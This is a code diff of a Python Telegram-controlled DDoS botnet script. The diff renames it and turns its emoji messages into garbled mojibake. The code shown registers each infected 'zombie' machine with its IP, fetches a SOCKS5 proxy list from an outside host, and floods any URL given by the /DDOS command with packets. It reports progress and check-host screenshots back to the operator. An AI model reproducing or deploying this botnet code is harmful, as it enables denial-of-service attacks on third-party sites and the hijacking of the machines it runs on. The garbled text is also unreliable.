@@ -1,5 +1,5 @@
-#Botnet  BOTECS 
-# Link Project : https://github.com/esfelurm/botecs
+#TELEGRAM-DDOS-BOT
+# Link Project :https://github.com/Muddasir35/Telegram-DDos-bot
 # writers : Esfelurm / Mr Root / Hydra
 # Broadcasting channel Telegram : @Team_Exploit
 # Tool Vip BotECS In channel : @KnightGuardian59
@@ -65,7 +65,7 @@ if 'linux' in typesys or 'mac' in typesys:
     system('clear')
     
 Tel = telfhk0.Telegram(chat=chat_id,token=token)
-text : str = 'Use /DDOS command to attack 🧨\n(Ex : /DDOS https://google.com 1000)\n\n🟡 least : 100 | 🟢 Maximum : 4000'
+text : str = 'Use /DDOS command to attack ðŸ§¨\n(Ex : /DDOS https://google.com 1000)\n\nðŸŸ¡ least : 100 | ðŸŸ¢ Maximum : 4000'
 TargetUr : list = []
 _send2_ : list = []
 counter : int = 0
@@ -74,9 +74,9 @@ try:
 except:print("Error Internet !")
 try:
     p = GET('https://api.openproxylist.xyz/socks5.txt').text
-    Tel.SendMessage(text="Proxy successfully downloaded ✄1�7")
+    Tel.SendMessage(text="Proxy successfully downloaded âœ„1¤7")
 except:
-	Tel.SendMessage(text="There was a problem downloading the proxy ⚠️")
+	Tel.SendMessage(text="There was a problem downloading the proxy âš ï¸")
 	
 with open('Proxyy.txt','w') as proxy_list:
     proxy_list.write(p)
@@ -88,10 +88,10 @@ if __name__ == '__main__':
         pass
     sleep(1)
     try:
-        Tel.SendMessage(text=f'༼A zombie infected ༽\n\n🟢 Info System : {typesys}\n🟢 Time : {str(datetime.now())}\n🟢 Ip : {str(s.getsockname()[0])}')
+        Tel.SendMessage(text=f'à¼¼A zombie infected à¼½\n\nðŸŸ¢ Info System : {typesys}\nðŸŸ¢ Time : {str(datetime.now())}\nðŸŸ¢ Ip : {str(s.getsockname()[0])}')
     except:
         try:
-            Tel.SendMessage(text=f'The server is started ✄1�7')
+            Tel.SendMessage(text=f'The server is started âœ„1¤7')
         except:
             pass
     sleep(2)
@@ -103,13 +103,13 @@ class Start():
     def __init__(self, url : str, proxylist : list, numbers : int) -> str:
         self.numbers = numbers
         if self.numbers > 4000:
-            Tel.SendMessage(text=f'🔴 The number entered is too high ❌\n\n🟢 number seted with : 4000')
+            Tel.SendMessage(text=f'ðŸ”´ The number entered is too high âŒ\n\nðŸŸ¢ number seted with : 4000')
             self.numbers : int = 4000
         elif self.numbers == '':
-            Tel.SendMessage(text=f'🔴 The number is not entered ❌\n\n🟢 number seted with : 4000')
+            Tel.SendMessage(text=f'ðŸ”´ The number is not entered âŒ\n\nðŸŸ¢ number seted with : 4000')
             self.numbers : int = 4000
         elif self.numbers < 100:
-            Tel.SendMessage(text=f'🔴 The number entered is less than 100 ❌\n\n🟢 number seted with : 4000')
+            Tel.SendMessage(text=f'ðŸ”´ The number entered is less than 100 âŒ\n\nðŸŸ¢ number seted with : 4000')
             self.numbers : int = 4000
         self.num : int = 0
         self.url = url
@@ -185,7 +185,7 @@ class Start():
                     s.close()
                 counting += 1
                 if counting == 200:
-                    Tel.SendMessage(text='🟠 200 packets were sent ')
+                    Tel.SendMessage(text='ðŸŸ  200 packets were sent ')
                     try:
                         check = f'https://mini.site-shot.com/x/codebazan.ir-Web-screenshot/1000/png/?https://check-host.net/check-http?host={self.url}'
                         try:
@@ -199,11 +199,11 @@ class Start():
                     except:
                         pass
                     try:
-                        Tel.SendPhoto(address='images01.png',caption=f'🟢 Screenshot of check Host \n⚄1�7 Link Check Host : [https://check-host.net/check-http?host={self.url}]\n🟢 Time : {str(datetime.now())}')
+                        Tel.SendPhoto(address='images01.png',caption=f'ðŸŸ¢ Screenshot of check Host \nâš„1¤7 Link Check Host : [https://check-host.net/check-http?host={self.url}]\nðŸŸ¢ Time : {str(datetime.now())}')
                     except:
                         pass
                 if counting == 600:
-                    Tel.SendMessage(text='🟡 600 packets were sent')
+                    Tel.SendMessage(text='ðŸŸ¡ 600 packets were sent')
                     try:
                         check = f'https://mini.site-shot.com/x/codebazan.ir-Web-screenshot/1000/png/?https://check-host.net/check-http?host={self.url}'
                         try:
@@ -217,11 +217,11 @@ class Start():
                     except:
                         pass
                     try:
-                        Tel.SendPhoto(address='images01.png',caption=f'🟢 Screenshot of check Host \n⚄1�7 Link Check Host : [https://check-host.net/check-http?host={self.url}]\n🟢 Time : {str(datetime.now())}')
+                        Tel.SendPhoto(address='images01.png',caption=f'ðŸŸ¢ Screenshot of check Host \nâš„1¤7 Link Check Host : [https://check-host.net/check-http?host={self.url}]\nðŸŸ¢ Time : {str(datetime.now())}')
                     except:
                         pass
                 if counting == 1200:
-                    Tel.SendMessage(text='🔵 1200 packets were sent')
+                    Tel.SendMessage(text='ðŸ”µ 1200 packets were sent')
                     try:
                         check = f'https://mini.site-shot.com/x/codebazan.ir-Web-screenshot/1000/png/?https://check-host.net/check-http?host={self.url}'
                         try:
@@ -235,11 +235,11 @@ class Start():
                     except:
                         pass
                     try:
-                        Tel.SendPhoto(address='images01.png',caption=f'🟢 Screenshot of check Host \n⚄1�7 Link Check Host : [https://check-host.net/check-http?host={self.url}]\n🟢 Time : {str(datetime.now())}')
+                        Tel.SendPhoto(address='images01.png',caption=f'ðŸŸ¢ Screenshot of check Host \nâš„1¤7 Link Check Host : [https://check-host.net/check-http?host={self.url}]\nðŸŸ¢ Time : {str(datetime.now())}')
                     except:
                         pass
                 if counting == 2200:
-                    Tel.SendMessage(text='🟣 2200 packets were sent')
+                    Tel.SendMessage(text='ðŸŸ£ 2200 packets were sent')
                     try:
                         check = f'https://mini.site-shot.com/x/codebazan.ir-Web-screenshot/1000/png/?https://check-host.net/check-http?host={self.url}'
                         try:
@@ -253,11 +253,11 @@ class Start():
                     except:
                         pass
                     try:
-                        Tel.SendPhoto(address='images01.png',caption=f'🟢 Screenshot of check Host \n⚄1�7 Link Check Host : [https://check-host.net/check-http?host={self.url}]\n🟢 Time : {str(datetime.now())}')
+                        Tel.SendPhoto(address='images01.png',caption=f'ðŸŸ¢ Screenshot of check Host \nâš„1¤7 Link Check Host : [https://check-host.net/check-http?host={self.url}]\nðŸŸ¢ Time : {str(datetime.now())}')
                     except:
                         pass
                 if counting == self.numbers:
-                    Tel.SendMessage(text=f'🟢 All packets have been sent \n🧨 Number of packets : {self.numbers}')
+                    Tel.SendMessage(text=f'ðŸŸ¢ All packets have been sent \nðŸ§¨ Number of packets : {self.numbers}')
                     try:
                         check = f'https://mini.site-shot.com/x/codebazan.ir-Web-screenshot/1000/png/?https://check-host.net/check-http?host={self.url}'
                         try:
@@ -275,7 +275,7 @@ class Start():
                         soup = Soup(GET(check_).text,'html.parser')
                         _text_ = findall(r'https://check-host.net/check-report/\w{11}', str(soup))
                         img = open('images01.png', 'rb+')
-                        Tel.SendPhoto(address='images01.png',caption=f'🟢 Screenshot of check Host \n⚄1�7 Link Check Host : [https://check-host.net/check-http?host={self.url}]\n🟢 Time : {str(datetime.now())}')
+                        Tel.SendPhoto(address='images01.png',caption=f'ðŸŸ¢ Screenshot of check Host \nâš„1¤7 Link Check Host : [https://check-host.net/check-http?host={self.url}]\nðŸŸ¢ Time : {str(datetime.now())}')
                     except:
                         pass
                     break
@@ -300,7 +300,7 @@ class Start():
                         Tel.SendPhoto(address='images01.png',caption=f'check Host End !\n Time : {str(datetime.now())}')
                     except:
                         pass
-                    Tel.SendMessage(text='The attack is over ✄1�7')
+                    Tel.SendMessage(text='The attack is over âœ„1¤7')
                     break
         else:
             Tel.SendMessage(text='error in file proxy list !')
@@ -327,8 +327,8 @@ while 1:
             date : str = str(datetime.now())
             date : list = date.split(' ')
             date : list = date[1].split('.')
-            assert Tel.SendMessage(text=f'🟢 your target : {TargetUr[0]} ☠️')
-            snt = dict(Tel.SendMessage('🟣 Preparing to attack....'))
+            assert Tel.SendMessage(text=f'ðŸŸ¢ your target : {TargetUr[0]} â˜ ï¸')
+            snt = dict(Tel.SendMessage('ðŸŸ£ Preparing to attack....'))
             try:
                 texts : dict = {
                     'text': f'The robots are ready !',
@@ -347,7 +347,7 @@ while 1:
         except:
             while count < 3:
                 try:
-                    assert Tel.SendMessage(text=f'🟢 your target : {TargetUr[0]} ☠️')
+                    assert Tel.SendMessage(text=f'ðŸŸ¢ your target : {TargetUr[0]} â˜ ï¸')
                     count += 3
                 except:
                     count += 1
@@ -368,17 +368,17 @@ while 1:
             soup = Soup(GET(check_).text,'html.parser')
             _text_ : list = findall(r'https://check-host.net/check-report/\w{11}', str(soup))
             img = open('images01.png', 'rb+')
-            Tel.SendPhoto(address='images01.png',caption=f'🟢 Screenshot of check Host\n🟢 Time : {str(datetime.now())}')
+            Tel.SendPhoto(address='images01.png',caption=f'ðŸŸ¢ Screenshot of check Host\nðŸŸ¢ Time : {str(datetime.now())}')
         except:
             pass
         try:
             net = Start(str(TargetUr[0]), proxy_list, int(_send2_[0]))
         except:
-            Tel.SendMessage(text='🔴 The command is wrong ❄1�7')
+            Tel.SendMessage(text='ðŸ”´ The command is wrong â„1¤7')
             speed()
         try:
             assert await net.run()
-            Tel.SendMessage(text='⚄1�7 End of the attack ')
+            Tel.SendMessage(text='âš„1¤7 End of the attack ')
         except:
-            Tel.SendMessage(text='⚄1�7 End of the attack ')
+            Tel.SendMessage(text='âš„1¤7 End of the attack ')
     ESNET(loop())
